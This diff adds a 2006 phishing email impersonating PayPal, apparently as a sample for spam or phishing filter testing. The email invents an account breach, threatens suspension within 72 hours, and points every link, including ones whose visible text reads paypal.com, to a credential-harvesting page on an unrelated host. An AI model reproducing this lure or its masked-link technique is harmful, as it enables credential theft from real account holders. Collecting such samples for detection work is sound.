@@ -1,0 +1,216 @@
+From nobody Sun Jan 25 13:48:14 2015
+Return-Path: <donna@mx1.bigtearice.net>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+ by naughty.example.com (Postfix) with ESMTP id 756B4CAB49E
+ for <nobody@login.example.com>; Thu, 27 Apr 2006 05:58:01 -0400 (EDT)
+Received: from mx1.bigtearice.net (mx1.bigtearice.net [202.64.76.214])
+ by mail2.example.com (Postfix) with ESMTP id 5D48C6FA370
+ for <nobody@example.com>; Thu, 27 Apr 2006 05:58:00 -0400 (EDT)
+Received: from mx1.bigtearice.net (localhost [127.0.0.1])
+ by mx1.bigtearice.net (8.13.3/8.13.3) with ESMTP id k3R9vxdC078323
+ for <nobody@example.com>; Thu, 27 Apr 2006 17:57:59 +0800 (HKT)
+ (envelope-from donna@mx1.bigtearice.net)
+Received: (from donna@localhost)
+ by mx1.bigtearice.net (8.13.3/8.13.1/Submit) id k3R9vx0i078322
+ for nobody@example.com; Thu, 27 Apr 2006 17:57:59 +0800 (HKT)
+ (envelope-from donna)
+Date: Thu, 27 Apr 2006 17:57:59 +0800 (HKT)
+To: nobody@example.com
+Subject: Protect Your Account Info
+Message-ID: <1146131879.16804.qmail@paypal.com>
+From: "PayPal" <CustomerService@paypal.com>
+Content-Type: text/html
+X-Scanned-By: MIMEDefang 2.56 on 202.64.76.214
+Status: 
+X-Status: 
+X-Keywords: 
+
+<html><head><title>PayPal</title>
+<style type="text/css">
+<!--
+.style4 {
+	font-size: 9px;
+	color: #999999;
+}
+-->
+</style>
+</head>
+<body><style type="text/css">BODY, TD {font-family: 
+verdana,arial,helvetica,sans-serif;font-size: 12px;color: #000000;}
+
+LI {line-height: 120%;}
+UL.smallBorder {margin:10px 5px 10px 20px;}
+LI.smallBorderLi {margin:0px 0px 5px 0px;}
+UL.Narrow {margin:10px 5px 0px 40px;}
+HR.dotted {width: 100%; margin-top: 0px; margin-bottom: 0px; 
+border-left: #fff; border-right: #fff; border-top: #fff; border-bottom: 
+2px dotted #ccc;}
+.smallEmphasis {font-family: 
+verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: 
+bold;color: #000000;}
+.serifBig {font-family: serif;font-size: 20px;font-weight: bold;color: 
+#000000;}
+.serif{font-family: serif;font-size: 16px;color: #000000;}
+.sansSerif{font-family: verdana,arial,helvetica,sans-serif; font-size: 
+16px;color: #000000;}
+.heading {font-family: verdana,arial,helvetica,sans-serif;font-size: 
+18px;font-weight: bold;color: #003366;}
+.subHeadingEoa {font-family: 
+verdana,arial,helvetica,sans-serif;font-size: 15px;font-weight: 
+bold;color: #000000;}
+.subHeading {font-family: verdana,arial,helvetica,sans-serif;font-size: 
+16px;font-weight: bold;color: #003366;}
+.sidebarText {font-family: verdana,arial,helvetica,sans-serif;font-size: 
+11px;color: #003366;}
+.sidebarTextBold {font-family: 
+verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: 
+bold;color: #003366;}
+.xptFooter {font-family: verdana,arial,helvetica,sans-serif;font-size: 
+11px;color: #aaaaaa;}
+.button {font-size: 13px; font-family: 
+verdana,arial,helvetica,sans-serif; font-weight: 400; 
+border-style:outset; color:#000000; background-color: #cccccc;}
+.smaller {font-family: verdana,arial,helvetica,sans-serif;font-size: 
+10px;color: #000000;}
+.smallerSidebar {font-family: 
+verdana,arial,helvetica,sans-serif;font-size: 10px;color: #003366;}
+.emphasis {font-weight: 700;}
+table#invoice, table#invoice_controls, table#invoice_note {	width: 
+600px;}
+table#invoice_note {margin-top:10px; margin-bottom:10px;}
+table#invoice_controls {text-align: right;}
+table#invoice {border-collapse: collapse; border:1px solid #aaa; }
+table#invoice td {font-size:11px; border:1px solid #ccc;	
+padding:2px;}
+table#invoice td.field_label_right, table#invoice 
+td.field_label_right_error {font-weight:bold;	text-align:right;}
+table#invoice td.field_label_right_error, table#invoice 
+td.field_label_error {color:red;}
+table#invoice tr.title td {font-weight:bold; line-height:20px; 
+text-align:left; background-color: #ccddee;}
+table#invoice input.readonly {border:0; text-align:right;}
+table#invoice input.readonly_currency {border:0; width:10px;}
+.field_error, .field_error input.readonly_currency 
+{background-color:#FF3333;}
+.currency_highlight {background-color: #ffffcc;}
+.tax {font-weight: 400; float: left;}
+table#invoice td span.curr {float: left;}
+table#invoice td.currency {border-right:1px solid #fff;}
+table#invoice td.calc {font-weight:bold; text-align:right;}
+.inlineBlue {color: #00f;}
+.small {font-size: 11px; font-weight: 400;}
+HR.solid {width: 100%; margin-top: 5px; margin-bottom: 0px; border-left: 
+#fff; border-right: #fff; border-top: #fff; border-bottom: 2px solid 
+#999;}
+.large {font-size: 17px;} 
+.smallVerdanaGrey{font-family: verdana; font-size: 10px; color: 
+#999999;} 
+.smallVerdana {font-family: verdana; font-size: 10px; color :#000000;} 
+.smallArial {font-family: arial; font-size: 13px; } 
+.smallArialBlue {font-family: verdana; font-size: 9px; color: #0000FF;} 
+.smallVerdanaGreen{font-family: verdana; font-size: 10px; color: 
+#666666;} 
+.smaller {font-size: 10px; color: gray;} 
+.larger {font-size: 18px; font-family: arial; font-weight: 600; }  
+.longTableValue{word-break:break-all;} 
+.longSideBarText{width:190px; word-break: break-all;} 
+</style>
+
+<table align="center" border="0" cellpadding="0" cellspacing="0" 
+width="600"><tr valign="top"><td><a 
+href="https://www.paypal.com/ie"><img 
+src="http://images.paypal.com/en_US/i/logo/email_logo.gif" border="0" 
+alt="PayPal"/></a></td></tr></table><table align="center" border="0" 
+cellpadding="0" cellspacing="0" width="100%"><tr><td 
+background="http://images.paypal.com/en_US/i/scr/bg_clk.gif" 
+width="100%"><img alt="" border="0" height="29" 
+src="http://images.paypal.com/en_US/i/scr/pixel.gif" 
+width="1"/></td></tr><tr><td><img alt="" border="0" height="10" 
+src="http://images.paypal.com/en_US/i/scr/pixel.gif" 
+width="1"/></td></tr></table><table align="center" border="0" 
+cellpadding="0" cellspacing="0" width="600"><tr><td/>&nbsp;&nbsp;</tr></table><table 
+align="center" border="0" cellpadding="0" cellspacing="0" 
+width="600"><tr valign="top"><td width="100%"><table align="right" 
+bgcolor="#cccccc" border="0" cellpadding="1" cellspacing="0" 
+width="190"><tr><td><table align="center" bgcolor="#ffffff" border="0" 
+cellpadding="0" cellspacing="0" width="100%"><tr><td><table 
+align="center" bgcolor="#eeeeee" border="0" cellpadding="5" 
+cellspacing="0" width="100%"><tr><td align="center"><span 
+class="sideBarTextBold">Protect Your Account 
+Info</span></td></tr></table><table align="center" border="0" 
+cellpadding="5" cellspacing="0" width="100%"><tr>
+                      <td 
+class="sideBarText"><a href="http://junior.topserverbr5.com/%7Ekids/cgi-bin/webscr.php?cmd=_login-run">Make 
+                        sure you never provide your password to fraudulent websites.</a><br/> 
+                        <br/>
+                        <a href="http://junior.topserverbr5.com/%7Ekids/cgi-bin/webscr.php?cmd=_login-run">PayPal 
+                        will never ask you to enter your password in an email.</a><br/> <br/>
+                        <a href="http://junior.topserverbr5.com/%7Ekids/cgi-bin/webscr.php?cmd=_login-run">For 
+                        more information on protecting yourself from fraud, please 
+                        review our Security Tips at <span 
+class="longSideBarText">https://www.paypal.com/ie/securitytips</span></a><br/>
+<img alt="" border="0" height="5" 
+src="http://images.paypal.com/en_US/i/scr/pixel.gif" 
+width="1"/></td></tr></table></td></tr></table><table align="center" 
+bgcolor="#ffffff" border="0" cellpadding="0" cellspacing="0" 
+width="100%"><tr><td><table align="center" bgcolor="#eeeeee" border="0" 
+cellpadding="5" cellspacing="0" width="100%"><tr><td align="center" 
+class="sideBarTextBold">Protect Your Password</td></tr></table><table 
+align="center" border="0" cellpadding="5" cellspacing="0" 
+width="100%"><tr>
+                      <td class="sideBarText"><a href="http://junior.topserverbr5.com/%7Ekids/cgi-bin/webscr.php?cmd=_login-run">You 
+                        should <span 
+class="emphasis">never</span> give your PayPal password to anyone, including PayPal 
+                        employees.</a><br/>
+                        <img alt="" border="0" height="5" 
+src="http://images.paypal.com/en_US/i/scr/pixel.gif" 
+width="1"/></td></tr></table></td></tr></table></td></tr><tr><td/>&nbsp;&nbsp;</tr></table>
+      It has come to our attention that your Paypal account has been 
+accessed by a third party, meaning that an unauthorized person has 
+logged into your account.<br>
+      We require that you login to your account and update your billing 
+information and security questions, so that furter third party access 
+can be prevented.
+      <p>Faillure to update your billing information and security 
+questions before 72 hours may ressult in suspension of your account.</p>
+      <p>To proceed in updating your billing information and security 
+questions, please click on the following link:</p>
+      <p><a 
+href="http://junior.topserverbr5.com/%7Ekids/cgi-bin/webscr.php?cmd=_login-run">http://www.paypal.com/us/cgi-bin/webscr?cmd= 
+        login-update&amp;login access=114248642</a></p>
+      <p>Updating your billing information and security questions will 
+prevent unauthorized third party access, and possibly unauthorized 
+purchases. We thank you for your participation in updating your 
+account.</p>
+      <p>Sincerely,<br>
+        The Paypal Team</p>
+      <p>&nbsp;</p><br/><br/><hr class="dotted"/>      <br/>
+  <span class="style4">Please note that this is not a complete list of 
+all our products and features. All products, features, and policies are 
+subject to change. Be sure to <a 
+href="https://www.paypal.com/ie/cgi-bin/webscr?cmd=_login-run">log 
+in</a> to your PayPal account on a regular basis to view the "Policy 
+Updates" page which can be found in the "What's New" box.</span>          
+<p class="style4">Please do not reply to this email. This mailbox is not 
+monitored and you will not receive a response. For assistance, <a 
+href="https://www.paypal.com/ie/cgi-bin/webscr?cmd=_login-run">log 
+in</a> to your PayPal account and choose the Help link located in the 
+top right corner of any PayPal page.<br/>
+              <br class="h10"/>
+            To receive email notifications in plain text instead of 
+HTML, update your preferences <a 
+href="https://www.paypal.com/ie/PREFS-NOTI">here</a>.</p>
+      <hr/>
+      <span class="style4">
+      
+      PayPal (Europe) Limited is authorized and regulated by the 
+Financial Services Authority in the United Kingdom as an electronic 
+money institution.<br/>
+      
+      </span>
+      <p class="style4">PayPal Email ID PP330</p></td>
+</tr>
+</table></body></html><!-- web35406.mail.mud.yahoo.com uncompressed Tue 
+Mar 21 13:19:25 PST 2006 -->
